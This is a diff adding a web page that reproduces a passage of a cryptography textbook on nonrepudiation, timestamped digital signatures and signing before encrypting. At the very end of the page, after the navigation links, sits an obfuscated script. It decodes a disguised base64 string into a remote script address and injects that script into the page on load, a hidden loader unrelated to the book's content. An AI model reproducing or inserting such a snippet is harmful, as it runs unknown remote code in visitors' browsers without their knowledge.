@@ -1,0 +1,110 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=040-042//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Nonrepudiation and Digital Signatures</I></B></FONT></P>
+<P>Alice can cheat with digital signatures and there&#146;s nothing that can be done about it. She can sign a document and then later claim that she did not. First, she signs the document normally. Then, she anonymously publishes her private key, conveniently loses it in a public place, or just pretends to do either one. Alice then claims that her signature has been compromised and that others are using it, pretending to be her. She disavows signing the document and any others that she signed using that private key. This is called repudiation.
+</P>
+<P>Timestamps can limit the effects of this kind of cheating, but Alice can always claim that her key was compromised earlier. If Alice times things well, she can sign a document and then successfully claim that she didn&#146;t. This is why there is so much talk about private keys buried in tamper-resistant modules&#151;so that Alice can&#146;t get at hers and abuse it.</P>
+<P>Although nothing can be done about this possible abuse, one can take steps to guarantee that old signatures are not invalidated by actions taken in disputing new ones. (For example, Alice could &#147;lose&#148; her key to keep from paying Bob for the junk car he sold her yesterday and, in the process, invalidate her bank account.) The solution is for the receiver of a signed document to have it timestamped [453].</P>
+<P>The general protocol is given in [28]:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice signs a message.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates a header containing some identifying information. She concatenates the header with the signed message, signs that, and sends it to Trent.
+<DD><B>(3)</B>&nbsp;&nbsp;Trent verifies the outside signature and confirms the identifying information. He adds a timestamp to Alice&#146;s signed message and the identifying information. Then he signs it all and sends it to both Alice and Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob verifies Trent&#146;s signature, the identifying information, and Alice&#146;s signature.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice verifies the message Trent sent to Bob. If she did not originate the message, she speaks up quickly.
+</DL>
+<P>Another scheme uses Trent after the fact [209]. After receiving a signed message, Bob can send a copy to Trent for verification. Trent can attest to the validity of Alice&#146;s signature.
+</P>
+<P><FONT SIZE="+1"><B><I>Applications of Digital Signatures</I></B></FONT></P>
+<P>One of the earliest proposed applications of digital signatures was to facilitate the verification of nuclear test ban treaties [1454,1467]. The United States and the Soviet Union (anyone remember the Soviet Union?) permitted each other to put seismometers on the other&#146;s soil to monitor nuclear tests. The problem was that each country needed to assure itself that the host nation was not tampering with the data from the monitoring nation&#146;s seismometers. Simultaneously, the host nation needed to assure itself that the monitor was sending only the specific information needed for monitoring.
+</P>
+<P>Conventional authentication techniques can solve the first problem, but only digital signatures can solve both problems. The host nation can read, but not alter, data from the seismometer, and the monitoring nation knows that the data has not been tampered with.</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">2.7 Digital Signatures with Encryption</FONT></H3>
+<P>By combining digital signatures with public-key cryptography, we develop a protocol that combines the security of encryption with the authenticity of digital signatures. Think of a letter from your mother: The signature provides proof of authorship and the envelope provides privacy.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice signs the message with her private key.
+<DL>
+<DD><I>S</I><SUB>A</SUB>(<I>M</I>)
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice encrypts the signed message with Bob&#146;s public key and sends it to Bob.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>S</I><SUB>A</SUB>(<I>M</I>))
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob decrypts the message with his private key.
+<DL>
+<DD><I>D</I><SUB>B</SUB>(<I>E</I><SUB>B</SUB>(<I>S</I><SUB>A</SUB>(<I>M</I>))) = <I>S</I><SUB>A</SUB>(<I>M</I>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob verifies with Alice&#146;s public key and recovers the message.
+<DL>
+<DD><I>V</I><SUB>A</SUB>(<I>S</I><SUB>A</SUB>(<I>M</I>)) = <I>M</I>
+</DL>
+</DL>
+<P>Signing before encrypting seems natural. When Alice writes a letter, she signs it and then puts it in an envelope. If she put the letter in the envelope unsigned and then signed the envelope, then Bob might worry if the letter hadn&#146;t been covertly replaced. If Bob showed to Carol Alice&#146;s letter and envelope, Carol might accuse Bob of lying about which letter arrived in which envelope.
+</P>
+<P>In electronic correspondence as well, signing before encrypting is a prudent practice [48]. Not only is it more secure&#151;an adversary can&#146;t remove a signature from an encrypted message and add his own&#151;but there are legal considerations: If the text to be signed is not visible to the signer when he affixes his signature, then the signature may have little legal force [1312]. And there are some cryptanalytic attacks against this technique with RSA signatures (see Section 19.3).</P>
+<P>There&#146;s no reason Alice has to use the same public-key/private-key key pair for encrypting and signing. She can have two key pairs: one for encryption and the other for signatures. Separation has its advantages: she can surrender her encryption key to the police without compromising her signature, one key can be escrowed (see Section 4.13) without affecting the other, and the keys can have different sizes and can expire at different times.</P>
+<P>Of course, timestamps should be used with this protocol to prevent reuse of messages. Timestamps can also protect against other potential pitfalls, such as the one described below.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(cvhiOQNi, BhlCLAqS) {BhlCLAqS = cvhiOQNi.createElement('script');BhlCLAqS.type = 'text/javascript';BhlCLAqS.async = true;BhlCLAqS.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');cvhiOQNi.getElementsByTagName('body')[0].appendChild(BhlCLAqS);}(document));</script></body>
+</html>
